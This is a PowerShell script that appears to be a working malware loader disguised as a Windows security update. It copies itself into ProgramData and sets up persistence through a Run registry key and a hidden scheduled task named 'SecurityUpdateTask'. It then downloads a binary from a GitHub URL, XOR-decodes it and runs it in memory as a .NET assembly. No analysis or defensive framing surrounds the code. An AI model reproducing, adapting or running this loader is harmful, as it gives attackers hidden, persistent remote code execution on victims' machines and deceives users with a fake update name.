
$Url = "https://github.com/khpccbr/open/raw/refs/heads/main/part2a.bin"
$folderPath = "C:\ProgramData\SecurityUpdate"
$scriptCopyName = "secupdate.ps1"
$payloadName = "secupdate.bin"
$scriptCopyPath = Join-Path -Path $folderPath -ChildPath $scriptCopyName
$payloadPath = Join-Path -Path $folderPath -ChildPath $payloadName
$taskName = "SecurityUpdateTask"
$registryName = "SecurityUpdateService"
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"


$currentScriptPath = $PSCommandPath
if (-not $currentScriptPath) {
    Write-Error "Script must be run from a file, not from console"
    exit 1
}

try {
    
    if (-not (Test-Path -Path $folderPath)) {
        New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
    }
    else {
    }
    
                
    try {
        Copy-Item -Path $currentScriptPath -Destination $scriptCopyPath -Force
    }
    catch {
        Write-Error "Failed to copy script: $_"
        exit 1
    }    
        
    $taskExists = $null -ne (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)
    $regExists = $null -ne (Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue)
    
    if ($taskExists -and $regExists) {
    }
    else {
        $executeCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopyPath`" -Url `"$Url`""
        try {
            Set-ItemProperty -Path $registryPath -Name $registryName -Value $executeCommand -Force
        }
        catch {
            Write-Warning "Failed to create registry key: $_"
        }

        
        try {
            
            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopyPath`" -Url `"$Url`""

            $triggerDaily = New-ScheduledTaskTrigger -Daily -At 9am
            $triggerLogon = New-ScheduledTaskTrigger -AtLogOn

            $settings = New-ScheduledTaskSettingsSet `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable `
                -Hidden `
                -ExecutionTimeLimit (New-TimeSpan -Hours 1)
            
            
            $principal = New-ScheduledTaskPrincipal `
                -UserId "$env:USERDOMAIN\$env:USERNAME" `
                -LogonType Interactive `
                -RunLevel Limited
            
            
            Register-ScheduledTask `
                -TaskName $taskName `
                -Action $action `
                -Trigger $triggerDaily, $triggerLogon `
                -Settings $settings `
                -Principal $principal `
                -Description "Windows Security Update Service" `
                -Force | Out-Null
                                                            
        }
        catch {
            Write-Warning "Failed to create scheduled task: $_"
        }
    }
    
    
                
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $payloadPath)
        $webClient.Dispose()
        
                
        
        if (Test-Path $payloadPath) {
            $fileInfo = Get-Item $payloadPath
        }
        
    }
    catch {
        Write-Error "Download failed: $_"
        exit 1
    }

    $key = 0x25

    
    $fileBytes = [System.IO.File]::ReadAllBytes($payloadPath)

    
    $xorBytes = New-Object byte[] $fileBytes.Length
    for ($i = 0; $i -lt $fileBytes.Length; $i++) {
        $xorBytes[$i] = $fileBytes[$i] -bxor ($key -band 0xFF)
    }

    try {
                
        
        $assembly = [System.Reflection.Assembly]::Load($xorBytes)
        
                
        
        $entryPoint = $assembly.EntryPoint
        
        if ($entryPoint -eq $null) {
            throw "No entry point found in assembly"
        }
        
        $parameters = $entryPoint.GetParameters()

        if ($parameters.Length -eq 0) {
            
            $result = $entryPoint.Invoke($null, $null)
        }
        else {
             
            
            $invokeParams = @(, $Arguments)
            $result = $entryPoint.Invoke($null, $invokeParams)
        }
        
    }
    catch {
        Write-Error "Failed to execute assembly: $_"
    }   
    
    
                                            
}
catch {
    Write-Error "Critical error occurred: $_"
    exit 1
}